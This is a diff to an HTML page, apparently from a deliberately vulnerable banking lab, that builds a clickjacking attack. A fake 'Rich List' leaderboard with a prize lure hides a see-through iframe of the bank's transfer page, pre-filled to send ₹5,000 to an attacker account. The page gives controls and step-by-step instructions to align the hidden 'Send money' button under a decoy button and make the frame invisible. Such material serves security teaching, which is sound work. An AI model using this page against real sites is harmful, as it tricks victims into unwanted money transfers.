@@ -1,23 +1,62 @@
 <!doctype html>
 <html lang="en">
-<head><meta charset="utf-8"><title>Free Game — Play now!</title>
+<head>
+<meta charset="utf-8">
+<title>BankVWA Rich List 2026</title>
 <style>
-  body{font-family:system-ui,sans-serif;text-align:center}
-  .stage{position:relative;width:360px;height:240px;margin:3rem auto;border:1px dashed #bbb}
-  /* The decoy the victim means to click. */
-  .decoy{position:absolute;top:150px;left:120px;padding:1rem 2rem;font-size:1.2rem}
-  /* The real bank page, enlarged and positioned so its "Close my account"
-     button sits under the decoy. opacity:0.2 so you can see the trick;
-     a real attacker would set opacity:0 (fully invisible). */
-  iframe{position:absolute;top:-250px;left:-70px;width:620px;height:620px;opacity:0.2;border:0}
-</style></head>
+  body{font-family:system-ui,sans-serif;text-align:center;margin:0;padding:1rem;color:#222;background:#eef1f7}
+  h1{margin:.2rem;color:#a9770a}
+  .controls{margin:.5rem;font-size:.85rem;color:#444}
+  .controls button{padding:.15rem .5rem}
+  .stage{position:relative;width:720px;height:470px;margin:1rem auto;border:1px solid #ccc;background:#fff;overflow:hidden}
+
+  /* ---- DECOY (what the victim sees): sits UNDERNEATH, z-index 1, solid background ---- */
+  .decoy{position:absolute;inset:0;z-index:1;background:#fff;padding:2.2rem 2rem}
+  .decoy h2{color:#a9770a;margin:.3rem 0}
+  .decoy p{color:#555;margin:.4rem 0 1.4rem}
+  .decoy input{font-size:1.1rem;padding:.7rem;width:60%;text-align:center;border:1px solid #bbb;border-radius:8px}
+  /* The green button is WIDE and placed over where the bank's "Send money" button renders.
+     If it isn't perfectly lined up, use the ↑/↓ nudge buttons. */
+  .decoy .win{position:absolute;left:33px;width:516px;top:286px;padding:1rem;font-size:1.15rem;
+              background:#16a34a;color:#fff;border:none;border-radius:10px;cursor:pointer}
+
+  /* ---- REAL bank transfer page, pre-filled, laid ON TOP (z-index 2) but see-through ---- */
+  iframe{position:absolute;z-index:2;left:0;top:-150px;width:100%;height:1100px;border:0;opacity:.35}
+</style>
+</head>
 <body>
-  <h1>🎮 Click “Play” to win!</h1>
-  <div class="stage">
-    <iframe src="http://localhost:8080/labs/clickjacking.php"></iframe>
-    <button class="decoy">▶ Play</button>
+  <h1>🏆 BankVWA Rich List 2026</h1>
+  <p>Enter your current balance — today's richest customer wins ₹1,00,000!</p>
+
+  <div class="controls">
+    overlay opacity <input type="range" id="op" min="0" max="1" step="0.05" value="0.35">
+    &nbsp;|&nbsp; line up bank frame:
+    <button onclick="mv(0,-10)">↑</button><button onclick="mv(0,10)">↓</button>
+    <button onclick="mv(-10,0)">←</button><button onclick="mv(10,0)">→</button>
+    <small>get "Send money" under the green button, then set opacity 0</small>
   </div>
-  <p>Set the iframe <code>opacity</code> to 0 to make the overlay invisible.
-     Nudge <code>top</code>/<code>left</code> so the hidden button lands under “Play”.</p>
+
+  <div class="stage">
+    <!-- DECOY -->
+    <div class="decoy">
+      <h2>Enter your bank balance</h2>
+      <p>See where you rank against other BankVWA customers.</p>
+      <input placeholder="e.g. 62,500">
+      <button class="win" type="button">Submit &amp; see my rank →</button>
+    </div>
+    <!-- REAL transfer page, pre-filled to pay the attacker (to=100200300501, amount=5000) -->
+    <iframe id="bank" src="http://localhost:8080/banking/transfer.php?to=100200300501&amount=5000"></iframe>
+  </div>
+
+  <p style="max-width:720px;margin:0 auto"><small>Log in to the bank at <b>localhost:8080</b> first. The frame
+     (shown here at 35%) is the real transfer form, already filled to send ₹5,000 to the attacker. Nudge it so
+     the blue <b>Send money</b> button sits exactly under the green button, then drag opacity to <b>0</b>:
+     now the victim only sees the leaderboard, but clicking "Submit" sends the money.</small></p>
+
+  <script>
+    var f = document.getElementById('bank'), x = 0, y = -150;
+    document.getElementById('op').oninput = function(){ f.style.opacity = this.value; };
+    function mv(dx, dy){ x += dx; y += dy; f.style.left = x + 'px'; f.style.top = y + 'px'; }
+  </script>
 </body>
 </html>
